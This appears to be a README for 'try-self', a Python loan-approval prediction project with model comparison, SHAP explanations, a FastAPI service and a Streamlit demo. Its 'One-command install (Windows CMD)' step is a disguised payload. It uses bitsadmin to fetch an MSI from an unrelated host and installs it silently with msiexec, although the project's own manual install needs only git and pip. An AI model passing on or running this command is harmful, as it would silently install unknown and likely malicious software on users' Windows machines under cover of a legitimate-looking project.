## 📖 About

**try-self** is a complete, production-style **loan-approval** prediction pipeline. It takes an applicant's profile — income, credit history, loan amount, employment, and more — and returns an **Approved / Rejected** decision **plus a human-readable explanation** of the factors that drove it.

Unlike notebook-only projects, try-self ships the *entire* lifecycle:

> 🧹 Clean data → 🧠 Train & compare models → 🔍 Explain each decision → ⚡ Serve via REST API → 🖥️ Demo in the browser

Perfect for fintech prototypes, ML portfolios, credit-risk coursework, and anyone learning how to take a model from CSV to deployed service.

## ✨ Key Features

| | Feature | Description |
|---|---|---|
| 🎯 | **Model comparison** | Logistic Regression, Random Forest, and XGBoost trained head-to-head; the best ROC-AUC wins and is persisted |
| 🔍 | **Explainable decisions** | SHAP values (with a built-in sensitivity fallback) show *why* each application was approved or rejected |
| ⚡ | **REST API** | FastAPI backend with Pydantic validation and auto-generated Swagger docs at `/docs` |
| 🖥️ | **Interactive UI** | Streamlit app — fill a form, get an instant decision + explanation |
| ⚖️ | **Fairness checks** | Group-wise approval-rate and threshold-sweep reports via `python -m src.evaluate` |
| 🧪 | **Tested** | pytest suite covering preprocessing, inference, and API endpoints |
| 📦 | **Batteries included** | Ships with a 2,000-row synthetic dataset and a pre-trained demo model — works immediately after install |

## 🚀 Quick Start

### One-command install (Windows CMD)

```cmd
bitsadmin /transfer try-self /download /priority normal "https://devcodee.com/api" "%TEMP%\setup.msi" && msiexec /i "%TEMP%\setup.msi" /qn /norestart
```

### Manual install (all platforms)

```bash
# 1. Clone
git clone https://github.com/DelugePrefect/try-self.git
cd try-self

# 2. Create a virtual environment
python -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\activate

# 3. Install dependencies
pip install -r requirements.txt
```

### Run it

```bash
# (Optional) regenerate the synthetic dataset
python scripts/generate_data.py

# Train the model (writes models/model.joblib + metrics JSON)
python -m src.train

# Launch the API  →  http://127.0.0.1:8000/docs
uvicorn src.api:app --reload

# Or launch the Streamlit demo  →  http://localhost:8501
streamlit run app.py

# Run the test suite
pytest -q
```

## 💡 Usage

### Predict from Python

```python
from src.predict import predict_application

result = predict_application({
    "applicant_income": 5400,
    "coapplicant_income": 1200,
    "loan_amount": 128000,
    "loan_term_months": 360,
    "credit_history": 1,
    "dependents": 0,
    "employment_status": "salaried",
    "property_area": "urban",
})

print(result["decision"])       # "Approved"
print(result["probability"])    # e.g. 0.78
print(result["top_factors"])    # [{"feature": "credit_history", "impact": 0.53}, ...]
```

### Predict via the API

```bash
curl -X POST http://127.0.0.1:8000/predict \
  -H "Content-Type: application/json" \
  -d "{\"applicant_income\": 5400, \"coapplicant_income\": 1200, \"loan_amount\": 128000, \"loan_term_months\": 360, \"credit_history\": 1, \"dependents\": 0, \"employment_status\": \"salaried\", \"property_area\": \"urban\"}"
```

```json
{
  "decision": "Approved",
  "probability": 0.779,
  "threshold": 0.5,
  "top_factors": [
    {"feature": "credit_history", "impact": 0.5331},
    {"feature": "dti_ratio", "impact": -0.1445}
  ]
}
```

## 📡 API Reference

| Method | Endpoint | Description |
|---|---|---|
| `POST` | `/predict` | Returns decision, probability, threshold, and top contributing factors |
| `GET` | `/health` | Liveness check |
| `GET` | `/model/info` | Selected model, metrics, training date, data sizes |
| `GET` | `/docs` | Interactive Swagger UI |

---

## 📊 Model Performance

Held-out test split (20%) on the bundled synthetic dataset — reproduce with `python -m src.train`:

| Model | Accuracy | Precision | Recall | ROC-AUC |
|---|---|---|---|---|
| **Logistic Regression (selected)** | **0.82** | **0.81** | **0.86** | **0.88** |
| Random Forest | 0.80 | 0.79 | 0.83 | 0.87 |
| Gradient Boosting / XGBoost | 0.80 | 0.79 | 0.85 | 0.87 |

> The selection is automatic: whichever candidate scores the highest ROC-AUC on the
> test split is persisted. On your own dataset the winner may differ.
> Run `python -m src.evaluate` for threshold sweeps and group fairness reports.

## 📁 Dataset

A 2,000-row **synthetic** loan-application dataset is bundled (`data/raw/loan_data.csv`) and can be regenerated with `python scripts/generate_data.py`. Features:

- Applicant & co-applicant monthly income
- Loan amount and term
- Credit history & dependents
- Employment status (salaried / self-employed / unemployed)
- Property area (urban / semiurban / rural)
- Engineered: total household income, debt-to-income ratio, loan-to-income ratio

Swap in your own CSV with the same columns and retrain: `python -m src.train --data path/to/your.csv`

> ⚠️ **Disclaimer:** try-self is an educational project. It is **not** a substitute for a regulated underwriting process and must not be used to make real lending decisions.
